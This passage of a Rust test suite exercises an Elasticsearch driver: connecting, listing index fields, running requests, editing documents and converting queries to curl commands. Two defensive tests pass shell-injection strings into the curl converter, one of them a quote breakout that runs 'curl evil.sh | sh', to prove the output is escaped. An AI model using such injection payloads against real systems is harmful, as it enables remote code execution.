        let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));

        let result = driver.connect().await;

        assert!(result.is_ok(), "connect failed: {:?}", result.err());
    }

    #[tokio::test]
    async fn list_schema_reports_index_fields_from_the_mapping() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let base_url = format!("http://127.0.0.1:{port}");
        let mut driver = ElasticsearchDriver::new(&base_url);
        driver.connect().await.unwrap();
        reqwest::Client::new()
            .put(format!("{base_url}/orders"))
            .header("content-type", "application/json")
            .body(
                r#"{"mappings":{"properties":{
                       "id":{"type":"long"},
                       "customer":{"properties":{"name":{"type":"text"}}}}}}"#,
            )
            .send()
            .await
            .unwrap();

        let schema = driver.list_schema().await.unwrap();

        let orders = schema
            .iter()
            .find(|entry| entry.name == "orders")
            .expect("the index we just created should be listed");
        let fields: Vec<&str> = orders.columns.iter().map(|c| c.name.as_str()).collect();
        assert!(fields.contains(&"id"), "fields were: {fields:?}");
        assert!(fields.contains(&"customer.name"), "fields were: {fields:?}");
    }

    #[tokio::test]
    async fn execute_runs_an_arbitrary_request_and_wraps_the_response_as_documents() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));
        driver.connect().await.unwrap();

        let result = driver.execute("GET _cluster/health").await.unwrap();

        match result {
            QueryResult::Documents(docs) => {
                assert_eq!(docs.len(), 1);
                assert!(docs[0].get("status").is_some(), "response was: {docs:?}");
            }
            other => panic!("expected Documents, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn execute_handles_the_cat_indices_plain_text_response() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));
        driver.connect().await.unwrap();

        let result = driver.execute("GET _cat/indices?v").await;

        let result = result.unwrap_or_else(|e| panic!("expected Ok, got error: {e:?}"));
        match result {
            QueryResult::Documents(docs) => {
                assert_eq!(docs.len(), 1);
                assert!(
                    docs[0].is_string(),
                    "expected a plain-text string, got: {docs:?}"
                );
                assert!(
                    docs[0].as_str().unwrap().contains("health"),
                    "expected the _cat/indices header row, got: {docs:?}"
                );
            }
            other => panic!("expected Documents, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn execute_unwraps_a_search_into_one_document_per_hit() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let base_url = format!("http://127.0.0.1:{port}");
        let mut driver = ElasticsearchDriver::new(&base_url);
        driver.connect().await.unwrap();
        let client = reqwest::Client::new();
        for (id, title) in [("1", "a"), ("2", "b")] {
            client
                .put(format!("{base_url}/orders/_doc/{id}?refresh=true"))
                .header("content-type", "application/json")
                .body(format!(r#"{{"title": "{title}"}}"#))
                .send()
                .await
                .unwrap();
        }

        let result = driver
            .execute("GET orders/_search\n{\"query\": {\"match_all\": {}}}")
            .await
            .unwrap();

        match result {
            QueryResult::Documents(docs) => {
                assert_eq!(docs.len(), 2, "docs were: {docs:?}");
                for doc in &docs {
                    assert!(doc.get("_id").is_some(), "doc was: {doc:?}");
                    assert!(doc.get("title").is_some(), "doc was: {doc:?}");
                }
            }
            other => panic!("expected Documents, got {other:?}"),
        }
    }

    /// End-to-end proof this feature actually works, not just that it
    /// builds the right-looking string: `edit_source`/`edit_sql` build a
    /// real update from a real `_search` hit, `execute()` runs it, and a
    /// direct `GET .../_doc/<id>` (bypassing the search index's own
    /// near-real-time refresh, unlike a second `_search`) confirms the
    /// document actually changed -- same for the follow-up delete.
    #[tokio::test]
    async fn edit_sql_round_trips_a_real_update_and_delete_against_a_search_hit() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let base_url = format!("http://127.0.0.1:{port}");
        let mut driver = ElasticsearchDriver::new(&base_url);
        driver.connect().await.unwrap();
        let client = reqwest::Client::new();
        client
            .put(format!("{base_url}/orders/_doc/1?refresh=true"))
            .header("content-type", "application/json")
            .body(r#"{"title": "a"}"#)
            .send()
            .await
            .unwrap();

        let query = "GET orders/_search\n{\"query\": {\"match_all\": {}}}";
        assert_eq!(driver.edit_source(query).as_deref(), Some("orders"));

        let update_sql = driver
            .edit_sql(&query_driver::RowEdit {
                table: "orders".to_string(),
                key: vec![("_id".to_string(), "1".to_string())],
                change: query_driver::RowChange::SetValue {
                    column: "title".to_string(),
                    value: "b".to_string(),
                },
            })
            .expect("a plain single-index search must be editable");
        driver.execute(&update_sql).await.unwrap();

        let after_update: serde_json::Value = client
            .get(format!("{base_url}/orders/_doc/1"))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();
        assert_eq!(
            after_update["_source"]["title"], "b",
            "doc after update: {after_update:?}"
        );

        let delete_sql = driver
            .edit_sql(&query_driver::RowEdit {
                table: "orders".to_string(),
                key: vec![("_id".to_string(), "1".to_string())],
                change: query_driver::RowChange::DeleteRow,
            })
            .unwrap();
        driver.execute(&delete_sql).await.unwrap();

        let after_delete: serde_json::Value = client
            .get(format!("{base_url}/orders/_doc/1"))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();
        assert_eq!(
            after_delete["found"], false,
            "doc should be deleted: {after_delete:?}"
        );
    }

    #[test]
    fn index_fields_flattens_nested_properties_into_paths() {
        let mappings = serde_json::json!({
            "orders": {
                "mappings": {
                    "properties": {
                        "id": {"type": "long"},
                        "customer": {
                            "properties": {
                                "name": {"type": "text"},
                                "address": {"properties": {"city": {"type": "keyword"}}}
                            }
                        }
                    }
                }
            }
        });

        let fields = index_fields(&mappings, "orders");

        let named: Vec<(&str, &str)> = fields
            .iter()
            .map(|c| (c.name.as_str(), c.type_name.as_str()))
            .collect();
        assert!(named.contains(&("id", "long")));
        assert!(
            named.contains(&("customer.name", "text")),
            "a nested field is named the way you'd write it in a query: {named:?}"
        );
        assert!(named.contains(&("customer.address.city", "keyword")));
        assert!(
            !named.iter().any(|(name, _)| *name == "customer"),
            "an object node is not itself a field: {named:?}"
        );
    }

    #[test]
    fn a_multi_field_is_not_reported_as_a_separate_field() {
        let mappings = serde_json::json!({
            "posts": {
                "mappings": {
                    "properties": {
                        "title": {
                            "type": "text",
                            "fields": {"keyword": {"type": "keyword"}}
                        }
                    }
                }
            }
        });

        let fields = index_fields(&mappings, "posts");

        assert_eq!(fields.len(), 1, "title.keyword is an indexing detail");
        assert_eq!(fields[0].name, "title");
        assert_eq!(fields[0].type_name, "text");
    }

    #[test]
    fn an_index_with_no_mapping_reports_no_fields() {
        let mappings = serde_json::json!({"other": {"mappings": {}}});

        assert!(index_fields(&mappings, "missing").is_empty());
        assert!(index_fields(&mappings, "other").is_empty());
        assert!(index_fields(&serde_json::Value::Null, "any").is_empty());
    }

    #[tokio::test]
    async fn list_schema_returns_created_indices() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let base_url = format!("http://127.0.0.1:{port}");
        let mut driver = ElasticsearchDriver::new(&base_url);
        driver.connect().await.unwrap();
        reqwest::Client::new()
            .put(format!("{base_url}/test-index"))
            .send()
            .await
            .unwrap();

        let schema = driver.list_schema().await.unwrap();

        assert!(
            schema.iter().any(|entry| entry.name == "test-index"),
            "schema was: {:?}",
            schema.iter().map(|s| &s.name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn to_curl_includes_the_body_when_present() {
        let curl = to_curl(
            "http://localhost:9200",
            "POST my-index/_search\n{\"query\":{\"match_all\":{}}}",
        )
        .unwrap();

        assert_eq!(
            curl,
            "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}}}'"
        );
    }

    #[test]
    fn to_curl_omits_the_body_flags_when_there_is_no_body() {
        let curl = to_curl("http://localhost:9200", "GET _cat/indices?v").unwrap();

        assert_eq!(curl, "curl -X GET 'http://localhost:9200/_cat/indices?v'");
    }

    #[test]
    fn to_curl_returns_none_for_unparseable_queries() {
        assert!(to_curl("http://localhost:9200", "").is_none());
    }

    #[test]
    fn to_curl_escapes_single_quotes_in_the_body_so_the_shell_command_is_safe() {
        let body = r#"{"query": "'; curl evil.sh | sh; '"}"#;
        let curl = to_curl(
            "http://localhost:9200",
            &format!("POST my-index/_search\n{body}"),
        )
        .unwrap();

        // Every `'` in the body must be replaced with the close-quote /
        // escaped-literal-quote / reopen-quote sequence `'\''`, so the body
        // stays a single shell argument with no early quote-close.
        let expected_escaped_body = r#"{"query": "'\''; curl evil.sh | sh; '\''"}"#;
        assert_eq!(
            curl,
            format!(
                "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{expected_escaped_body}'"
            )
        );
    }

    #[test]
    fn to_curl_escaped_body_round_trips_through_a_real_shell() {
        let body = r#"{"query": "'; touch /tmp/tradar-to-curl-test-should-not-exist; '"}"#;
        let curl = to_curl(
            "http://localhost:9200",
            &format!("POST my-index/_search\n{body}"),
        )
        .unwrap();

        // Run the generated command through a real shell, replacing `curl`
        // with `echo` so nothing actually hits the network, and assert the
        // shell reconstructs exactly the original (unescaped) body as a
        // single argument — proving the embedded `'; ...; '` never breaks
        // out of the quoted string.
        let script = curl.replacen("curl", "echo", 1);
        let output = std::process::Command::new("sh")
            .arg("-c")
            .arg(&script)
            .output()
            .unwrap();
        let stdout = String::from_utf8_lossy(&output.stdout);

        assert!(
            !std::path::Path::new("/tmp/tradar-to-curl-test-should-not-exist").exists(),
            "the injected `touch` command ran — to_curl produced unsafe shell output: {curl}"
        );
        assert!(
            stdout.contains(body),
            "expected the shell-parsed output to contain the original body verbatim, got: {stdout}"
        );
    }
}
